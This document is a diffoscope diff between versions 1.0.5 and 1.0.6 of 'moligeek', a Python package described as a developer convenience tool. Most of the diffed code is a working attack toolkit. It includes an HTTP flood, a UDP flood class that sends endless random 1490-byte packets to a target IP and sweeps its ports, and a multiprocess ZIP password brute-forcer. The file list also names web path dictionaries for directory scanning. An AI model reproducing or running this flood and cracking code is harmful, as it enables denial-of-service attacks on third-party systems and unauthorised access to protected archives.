# Comparing `tmp/moligeek-1.0.5.tar.gz` & `tmp/moligeek-1.0.6.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "moligeek-1.0.5.tar", last modified: Wed Aug  2 15:42:41 2023, max compression
+gzip compressed data, was "moligeek-1.0.6.tar", last modified: Sun Aug  6 03:15:29 2023, max compression
```

## Comparing `moligeek-1.0.5.tar` & `moligeek-1.0.6.tar`

### file list

```diff
@@ -1,48 +1,48 @@
-drwxrwxrwx   0        0        0        0 2023-08-02 15:42:41.128351 moligeek-1.0.5/
--rw-rw-rw-   0        0        0    11558 2023-06-23 14:02:51.000000 moligeek-1.0.5/LICENSE
--rw-rw-rw-   0        0        0      137 2023-08-02 14:35:19.000000 moligeek-1.0.5/MANIFEST.in
--rw-rw-rw-   0        0        0     6553 2023-08-02 15:42:41.127357 moligeek-1.0.5/PKG-INFO
--rw-rw-rw-   0        0        0     5713 2023-08-02 15:20:31.000000 moligeek-1.0.5/README.md
--rw-rw-rw-   0        0        0       64 2023-08-02 14:35:19.000000 moligeek-1.0.5/main.py
-drwxrwxrwx   0        0        0        0 2023-08-02 15:42:41.099017 moligeek-1.0.5/moligeek/
--rw-rw-rw-   0        0        0     7457 2023-08-02 14:35:19.000000 moligeek-1.0.5/moligeek/__init__.py
--rw-rw-rw-   0        0        0      340 2023-08-02 15:42:13.000000 moligeek-1.0.5/moligeek/__version__.py
-drwxrwxrwx   0        0        0        0 2023-08-02 15:42:41.112063 moligeek-1.0.5/moligeek/core/
-drwxrwxrwx   0        0        0        0 2023-08-02 15:42:41.114051 moligeek-1.0.5/moligeek/core/LAN/
--rw-rw-rw-   0        0        0       43 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/core/LAN/__init__.py
--rw-rw-rw-   0        0        0     1206 2023-08-02 08:24:54.000000 moligeek-1.0.5/moligeek/core/LAN/scan.py
--rw-rw-rw-   0        0        0      709 2023-08-02 08:24:54.000000 moligeek-1.0.5/moligeek/core/__init__.py
-drwxrwxrwx   0        0        0        0 2023-08-02 15:42:41.116043 moligeek-1.0.5/moligeek/core/encode/
--rw-rw-rw-   0        0        0       42 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/core/encode/__init__.py
--rw-rw-rw-   0        0        0     1097 2023-08-02 05:54:20.000000 moligeek-1.0.5/moligeek/core/encode/decode.py
--rw-rw-rw-   0        0        0     1183 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/core/encode/fence.py
-drwxrwxrwx   0        0        0        0 2023-08-02 15:42:41.118045 moligeek-1.0.5/moligeek/core/network/
--rw-rw-rw-   0        0        0     2047 2023-08-02 15:22:21.000000 moligeek-1.0.5/moligeek/core/network/__init__.py
--rw-rw-rw-   0        0        0     1566 2023-08-02 08:24:54.000000 moligeek-1.0.5/moligeek/core/network/hostinfo.py
--rw-rw-rw-   0        0        0     1418 2023-08-02 08:24:54.000000 moligeek-1.0.5/moligeek/core/network/wifi.py
-drwxrwxrwx   0        0        0        0 2023-08-02 15:42:41.119034 moligeek-1.0.5/moligeek/core/web/
--rw-rw-rw-   0        0        0     3069 2023-08-02 15:40:40.000000 moligeek-1.0.5/moligeek/core/web/__init__.py
--rw-rw-rw-   0        0        0     6177 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/core/web/imitate.py
-drwxrwxrwx   0        0        0        0 2023-08-02 15:42:41.119952 moligeek-1.0.5/moligeek/core/zip/
--rw-rw-rw-   0        0        0     5356 2023-08-02 05:54:20.000000 moligeek-1.0.5/moligeek/core/zip/__init__.py
-drwxrwxrwx   0        0        0        0 2023-08-02 15:42:41.121025 moligeek-1.0.5/moligeek/database/
--rw-rw-rw-   0        0        0   155593 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/database/YiYan.dat
-drwxrwxrwx   0        0        0        0 2023-08-02 15:42:41.126302 moligeek-1.0.5/moligeek/path_dict/
--rw-rw-rw-   0        0        0    40710 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/path_dict/ASP.txt
--rw-rw-rw-   0        0        0    18013 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/path_dict/ASPX.txt
--rw-rw-rw-   0        0        0    23958 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/path_dict/DIR.txt
--rw-rw-rw-   0        0        0    13824 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/path_dict/JSP.txt
--rw-rw-rw-   0        0        0    10198 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/path_dict/MDB.txt
--rw-rw-rw-   0        0        0    21362 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/path_dict/PHP.txt
--rw-rw-rw-   0        0        0      303 2023-06-23 14:02:51.000000 moligeek-1.0.5/moligeek/path_dict/__init__.py
-drwxrwxrwx   0        0        0        0 2023-08-02 15:42:41.111063 moligeek-1.0.5/moligeek.egg-info/
--rw-rw-rw-   0        0        0     6553 2023-08-02 15:42:40.000000 moligeek-1.0.5/moligeek.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      918 2023-08-02 15:42:41.000000 moligeek-1.0.5/moligeek.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-08-02 15:42:40.000000 moligeek-1.0.5/moligeek.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       42 2023-08-02 15:42:40.000000 moligeek-1.0.5/moligeek.egg-info/entry_points.txt
--rw-rw-rw-   0        0        0        2 2023-08-02 09:02:13.000000 moligeek-1.0.5/moligeek.egg-info/not-zip-safe
--rw-rw-rw-   0        0        0       57 2023-08-02 15:42:40.000000 moligeek-1.0.5/moligeek.egg-info/requires.txt
--rw-rw-rw-   0        0        0        9 2023-08-02 15:42:40.000000 moligeek-1.0.5/moligeek.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       64 2023-08-01 06:48:22.000000 moligeek-1.0.5/requirements.txt
--rw-rw-rw-   0        0        0       42 2023-08-02 15:42:41.128351 moligeek-1.0.5/setup.cfg
--rw-rw-rw-   0        0        0     1768 2023-08-02 14:35:19.000000 moligeek-1.0.5/setup.py
+drwxrwxrwx   0        0        0        0 2023-08-06 03:15:29.550944 moligeek-1.0.6/
+-rw-rw-rw-   0        0        0    11558 2023-06-23 14:02:51.000000 moligeek-1.0.6/LICENSE
+-rw-rw-rw-   0        0        0      137 2023-08-02 14:35:19.000000 moligeek-1.0.6/MANIFEST.in
+-rw-rw-rw-   0        0        0     6553 2023-08-06 03:15:29.550944 moligeek-1.0.6/PKG-INFO
+-rw-rw-rw-   0        0        0     5713 2023-08-02 15:20:31.000000 moligeek-1.0.6/README.md
+-rw-rw-rw-   0        0        0       64 2023-08-02 14:35:19.000000 moligeek-1.0.6/main.py
+drwxrwxrwx   0        0        0        0 2023-08-06 03:15:29.469948 moligeek-1.0.6/moligeek/
+-rw-rw-rw-   0        0        0     7369 2023-08-06 03:14:42.000000 moligeek-1.0.6/moligeek/__init__.py
+-rw-rw-rw-   0        0        0      340 2023-08-06 03:14:42.000000 moligeek-1.0.6/moligeek/__version__.py
+drwxrwxrwx   0        0        0        0 2023-08-06 03:15:29.488178 moligeek-1.0.6/moligeek/core/
+drwxrwxrwx   0        0        0        0 2023-08-06 03:15:29.488178 moligeek-1.0.6/moligeek/core/LAN/
+-rw-rw-rw-   0        0        0       43 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/core/LAN/__init__.py
+-rw-rw-rw-   0        0        0     1206 2023-08-02 08:24:54.000000 moligeek-1.0.6/moligeek/core/LAN/scan.py
+-rw-rw-rw-   0        0        0      709 2023-08-02 08:24:54.000000 moligeek-1.0.6/moligeek/core/__init__.py
+drwxrwxrwx   0        0        0        0 2023-08-06 03:15:29.503184 moligeek-1.0.6/moligeek/core/encode/
+-rw-rw-rw-   0        0        0       42 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/core/encode/__init__.py
+-rw-rw-rw-   0        0        0     1097 2023-08-02 05:54:20.000000 moligeek-1.0.6/moligeek/core/encode/decode.py
+-rw-rw-rw-   0        0        0     1183 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/core/encode/fence.py
+drwxrwxrwx   0        0        0        0 2023-08-06 03:15:29.504662 moligeek-1.0.6/moligeek/core/network/
+-rw-rw-rw-   0        0        0     2510 2023-08-06 03:14:42.000000 moligeek-1.0.6/moligeek/core/network/__init__.py
+-rw-rw-rw-   0        0        0     1563 2023-08-06 03:14:42.000000 moligeek-1.0.6/moligeek/core/network/hostinfo.py
+-rw-rw-rw-   0        0        0     1418 2023-08-02 08:24:54.000000 moligeek-1.0.6/moligeek/core/network/wifi.py
+drwxrwxrwx   0        0        0        0 2023-08-06 03:15:29.504662 moligeek-1.0.6/moligeek/core/web/
+-rw-rw-rw-   0        0        0     3069 2023-08-02 15:40:40.000000 moligeek-1.0.6/moligeek/core/web/__init__.py
+-rw-rw-rw-   0        0        0     6177 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/core/web/imitate.py
+drwxrwxrwx   0        0        0        0 2023-08-06 03:15:29.504662 moligeek-1.0.6/moligeek/core/zip/
+-rw-rw-rw-   0        0        0     5343 2023-08-06 03:14:42.000000 moligeek-1.0.6/moligeek/core/zip/__init__.py
+drwxrwxrwx   0        0        0        0 2023-08-06 03:15:29.504662 moligeek-1.0.6/moligeek/database/
+-rw-rw-rw-   0        0        0   155593 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/database/YiYan.dat
+drwxrwxrwx   0        0        0        0 2023-08-06 03:15:29.550944 moligeek-1.0.6/moligeek/path_dict/
+-rw-rw-rw-   0        0        0    40710 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/path_dict/ASP.txt
+-rw-rw-rw-   0        0        0    18013 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/path_dict/ASPX.txt
+-rw-rw-rw-   0        0        0    23958 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/path_dict/DIR.txt
+-rw-rw-rw-   0        0        0    13824 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/path_dict/JSP.txt
+-rw-rw-rw-   0        0        0    10198 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/path_dict/MDB.txt
+-rw-rw-rw-   0        0        0    21362 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/path_dict/PHP.txt
+-rw-rw-rw-   0        0        0      303 2023-06-23 14:02:51.000000 moligeek-1.0.6/moligeek/path_dict/__init__.py
+drwxrwxrwx   0        0        0        0 2023-08-06 03:15:29.488178 moligeek-1.0.6/moligeek.egg-info/
+-rw-rw-rw-   0        0        0     6553 2023-08-06 03:15:29.000000 moligeek-1.0.6/moligeek.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      918 2023-08-06 03:15:29.000000 moligeek-1.0.6/moligeek.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-08-06 03:15:29.000000 moligeek-1.0.6/moligeek.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       42 2023-08-06 03:15:29.000000 moligeek-1.0.6/moligeek.egg-info/entry_points.txt
+-rw-rw-rw-   0        0        0        2 2023-08-02 09:02:13.000000 moligeek-1.0.6/moligeek.egg-info/not-zip-safe
+-rw-rw-rw-   0        0        0       57 2023-08-06 03:15:29.000000 moligeek-1.0.6/moligeek.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        9 2023-08-06 03:15:29.000000 moligeek-1.0.6/moligeek.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       64 2023-08-01 06:48:22.000000 moligeek-1.0.6/requirements.txt
+-rw-rw-rw-   0        0        0       42 2023-08-06 03:15:29.550944 moligeek-1.0.6/setup.cfg
+-rw-rw-rw-   0        0        0     1768 2023-08-02 14:35:19.000000 moligeek-1.0.6/setup.py
```

### Comparing `moligeek-1.0.5/LICENSE` & `moligeek-1.0.6/LICENSE`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/PKG-INFO` & `moligeek-1.0.6/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: moligeek
-Version: 1.0.5
+Version: 1.0.6
 Summary: 一款逐渐完善的python集成工具,努力为开发者提供最大的便利
 Home-page: https://github.com/yourmoln/moligeek
 Author: yourmoln
 Author-email: yourmoln@outlook.com
 License: Apache 2.0
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: moligeek Version: 1.0.5 Summary:
+Metadata-Version: 2.1 Name: moligeek Version: 1.0.6 Summary:
 ä¸æ¬¾éæ¸å®åçpythonéæå·¥å·,åªåä¸ºå¼åèæä¾æå¤§çä¾¿å©
 Home-page: https://github.com/yourmoln/moligeek Author: yourmoln Author-email:
 yourmoln@outlook.com License: Apache 2.0 Classifier: Development Status :: 5 -
 Production/Stable Classifier: Intended Audience :: Developers Classifier: Topic
 :: Software Development :: Build Tools Classifier: License :: OSI Approved ::
 Apache Software License Classifier: Programming Language :: Python :: 3.7
 Classifier: Programming Language :: Python :: 3.8 Classifier: Programming
```

### Comparing `moligeek-1.0.5/README.md` & `moligeek-1.0.6/README.md`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/__init__.py` & `moligeek-1.0.6/moligeek/__init__.py`

 * *Files 2% similar despite different names*

```diff
@@ -105,40 +105,37 @@
             try:
                 speed = int(input("请输入攻击速度(小心卡死自己):"))
                 speed = speed if speed > 0 else 10
             except:
                 print("设置错误，默认为10")
                 speed = 10
             a = network.Attack(url,speed)
-            t = threading.Thread(target=a.startattack, args=())
-            t.start()
-            while True:
+            a.run()
+            while a.start:
                 print("\r已发送{}个包，失效{}个包".format(
                 a.collector['success'] + a.collector['err'],
                 a.collector['err']
             ), end="")
     elif mainmode in ["2", "network"]:
         target_ip = input("请输入目标ip:")
         mode = input("请选择模式:\n[1]泛洪攻击\n[2]洪攻击\n[3]ping\n")
 
         if mode in ["1", "泛洪攻击"]:
             print("\033[31m注意！此功能极有可能耗尽你的宽带\033[0m")#红色字体
             port = int(input("请输入起始端口:"))
             d = network.Ddos(target_ip, port = port)
-            t = threading.Thread(target=d.all, args=())
-            t.start()
-            while True:
+            d.all()
+            while d.start:
                 print ("\r已发送 %s 个包到 %s 通过端口:%s"%(d.data['sent'],d.ip,d.data['port']),end="")
         if mode in ["2", "洪攻击"]:
             print("\033[31m注意！此功能极有可能耗尽你的宽带\033[0m")#红色字体
             port = int(input("请输入目标端口:"))
             d = network.Ddos(target_ip, port = port)
-            t = threading.Thread(target=d.one, args=())
-            t.start()
-            while True:
+            d.one()
+            while d.start:
                 print ("\r已发送 %s 个包到 %s 通过端口:%s"%(d.data['sent'],d.ip,d.port),end="")
         if mode in ["3", "ping"]:
             print("pinging...")
             print(network.ping(target_ip))
     elif mainmode in ["3", "LAN"]:
         mode = input("请选择模式:\n[1]设备扫描\n")
 
@@ -163,14 +160,15 @@
             textlengh = int(input("每组字数:"))
             print(encode.fence.decrypt(codetext, textlengh))
 
     elif mainmode in ["5", "压缩包破解"]:
         zip_path = input("请输入压缩包路径:")
         mode = input("请选择破解模式:\n[1]纯数字\n[2]数字字母混合\n[3]数字字母符号混合\n")
         if mode in ["1", "纯数字"]:
-            print(zip.zipkey(zip_path,0))
+            password,time = zip.zipkey(zip_path,0)
         if mode in ["2", "数字字母混合"]:
-            print(zip.zipkey(zip_path,1))
+            password,time = zip.zipkey(zip_path,1)
         if mode in ["3", "数字字母符号混合"]:
-            print(zip.zipkey(zip_path,2))
+            password,time = zip.zipkey(zip_path,2)
+        print(f"密码为{password},总共耗时{time}秒")
     if os.name == "nt":
         input("按回车键结束程序")
```

### Comparing `moligeek-1.0.5/moligeek/core/LAN/scan.py` & `moligeek-1.0.6/moligeek/core/LAN/scan.py`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/core/__init__.py` & `moligeek-1.0.6/moligeek/core/__init__.py`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/core/encode/decode.py` & `moligeek-1.0.6/moligeek/core/encode/decode.py`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/core/encode/fence.py` & `moligeek-1.0.6/moligeek/core/encode/fence.py`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/core/network/__init__.py` & `moligeek-1.0.6/moligeek/core/network/__init__.py`

 * *Files 21% similar despite different names*

```diff
@@ -27,55 +27,70 @@
             try:
                 r = requests.get(self.url, self.headers)
                 self.collector['success'] += 1
             except:
                 # 发送失败
                 self.collector['err'] += self.speed - i
                 break
-    def startattack(self):
-        while True:
+    def attackRun(self):
+        while self.start:
             t = threading.Thread(target=self.attack, args=())
             t.start()
+    def run(self):
+        self.start = True
+        t = threading.Thread(target=self.attackRun, args=())
+        t.start()
+    def stop(self):
+        self.start = False
     def __init__(self, url, speed, headers=headers):
         self.url = url
         self.speed = speed
         self.headers = headers
         self.collector = {
             "success": 0,
             "err": 0,
         }
 
 
 class Ddos:
     # 泛洪攻击
-    def all(self):
+    def allRun(self):
         self.data['port'] = self.port
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1490)
-        while True:
-            sock.sendto(bytes, (self.ip,self.data['port']))
+        while self.start:
+            self.sock.sendto(self.bytes, (self.ip,self.data['port']))
             self.data['sent'] += 1
             self.data['port'] += 1
             if self.data['port'] == 65534:
                 self.data['port'] = 1
+    def all(self):
+        self.start = True
+        t = threading.Thread(target=self.allRun, args=())
+        t.start()
     # 洪攻击
-    def one(self):
+    def oneRun(self):
         self.rport = self.port
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1490)
-        
-        while True:
-            sock.sendto(bytes, (self.ip,self.port))
+        while self.start:
+            self.sock.sendto(self.bytes, (self.ip,self.port))
             self.data['sent'] += 1
+    def one(self):
+        self.start = True
+        t = threading.Thread(target=self.oneRun, args=())
+        t.start()
+    # 停止攻击
+    def stop(self):
+        self.start = False
     def __init__(self, ip, port = 1):
         self.sent = 0
         self.ip = ip
         self.port = port
         self.data = {
             "sent": 0,
             "port": 0,
         }
+        #初始化数据包
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.bytes = random._urandom(1490)
 
 
 
 if __name__ == "__main__":
     print(ping('8.8.8.8'))
```

### Comparing `moligeek-1.0.5/moligeek/core/network/hostinfo.py` & `moligeek-1.0.6/moligeek/core/network/hostinfo.py`

 * *Files 10% similar despite different names*

```diff
@@ -1,9 +1,9 @@
 import socket,json,os,platform,time
-from urllib.request import urlopen
+from requests import get
 
 class Hostinfo:
     def getip(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             address = ("8.8.8.8", 80)
             s.connect(address)
@@ -11,15 +11,15 @@
             ip = sockname[0]
             port = sockname[1]
         finally:
             s.close()
         return ip
     def getoutip(self):
         try:
-            return json.load(urlopen('http://jsonip.com'))['ip']
+            return get('http://ifconfig.me/ip', timeout=1).text.strip()
         except:
             return None
     def all(self):
         result = {"网络信息":{"公网ip":self.outip,"内网ip":self.ip},
                   "系统信息":{"系统类型":platform.system(),
                                 "系统版本":platform.version(),
                                 "计算机名":platform.node(),
```

### Comparing `moligeek-1.0.5/moligeek/core/network/wifi.py` & `moligeek-1.0.6/moligeek/core/network/wifi.py`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/core/web/__init__.py` & `moligeek-1.0.6/moligeek/core/web/__init__.py`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/core/web/imitate.py` & `moligeek-1.0.6/moligeek/core/web/imitate.py`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/core/zip/__init__.py` & `moligeek-1.0.6/moligeek/core/zip/__init__.py`

 * *Files 2% similar despite different names*

```diff
@@ -132,15 +132,15 @@
     elif mode in ["letter + number + symbol",2]:
         PWD_SEED = b"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM!@#$%^&*()_+-=[{}]\|;:,<.>/?'\" "
     st = time.time()
     zp = ZipPasswordGuesser(path)
     k = zp.guess_mp(n_processes=16, slice_size=1000)
     #k = zp.guess_normal()
     ed = time.time()
-    return f"密码为{k.decode('utf8')},总计用时{int((ed - st)*10)/10}s"
+    return k.decode('utf8'),int((ed - st)*10)/10
 
 # 检测并去除引号
 def remove_quotes(string):
     if len(string) >= 2 and string[0] == string[-1] and (string[0] == '"' or string[0] == "'"):
         return string[1:-1]
     return string
 
@@ -152,9 +152,9 @@
     # st = time.time()
     # zp = ZipPasswordGuesser("./test/flag.zip")
     # k = zp.guess_mp(n_processes=16, slice_size=1000)
     # k = zp.guess_normal()
     # print(k)
     # ed = time.time()
     # print(ed - st)
-    zipkey(r"C:\Users\yourm\Desktop\1\flag.zip",1)
+    password,time = zipkey(r"C:\Users\yourm\Desktop\1\flag.zip",1)
     ...
```

### Comparing `moligeek-1.0.5/moligeek/database/YiYan.dat` & `moligeek-1.0.6/moligeek/database/YiYan.dat`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/path_dict/ASP.txt` & `moligeek-1.0.6/moligeek/path_dict/ASP.txt`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/path_dict/ASPX.txt` & `moligeek-1.0.6/moligeek/path_dict/ASPX.txt`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/path_dict/DIR.txt` & `moligeek-1.0.6/moligeek/path_dict/DIR.txt`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/path_dict/JSP.txt` & `moligeek-1.0.6/moligeek/path_dict/JSP.txt`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/path_dict/MDB.txt` & `moligeek-1.0.6/moligeek/path_dict/MDB.txt`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek/path_dict/PHP.txt` & `moligeek-1.0.6/moligeek/path_dict/PHP.txt`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/moligeek.egg-info/PKG-INFO` & `moligeek-1.0.6/moligeek.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: moligeek
-Version: 1.0.5
+Version: 1.0.6
 Summary: 一款逐渐完善的python集成工具,努力为开发者提供最大的便利
 Home-page: https://github.com/yourmoln/moligeek
 Author: yourmoln
 Author-email: yourmoln@outlook.com
 License: Apache 2.0
 Classifier: Development Status :: 5 - Production/Stable
 Classifier: Intended Audience :: Developers
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: moligeek Version: 1.0.5 Summary:
+Metadata-Version: 2.1 Name: moligeek Version: 1.0.6 Summary:
 ä¸æ¬¾éæ¸å®åçpythonéæå·¥å·,åªåä¸ºå¼åèæä¾æå¤§çä¾¿å©
 Home-page: https://github.com/yourmoln/moligeek Author: yourmoln Author-email:
 yourmoln@outlook.com License: Apache 2.0 Classifier: Development Status :: 5 -
 Production/Stable Classifier: Intended Audience :: Developers Classifier: Topic
 :: Software Development :: Build Tools Classifier: License :: OSI Approved ::
 Apache Software License Classifier: Programming Language :: Python :: 3.7
 Classifier: Programming Language :: Python :: 3.8 Classifier: Programming
```

### Comparing `moligeek-1.0.5/moligeek.egg-info/SOURCES.txt` & `moligeek-1.0.6/moligeek.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `moligeek-1.0.5/setup.py` & `moligeek-1.0.6/setup.py`

 * *Files identical despite different names*

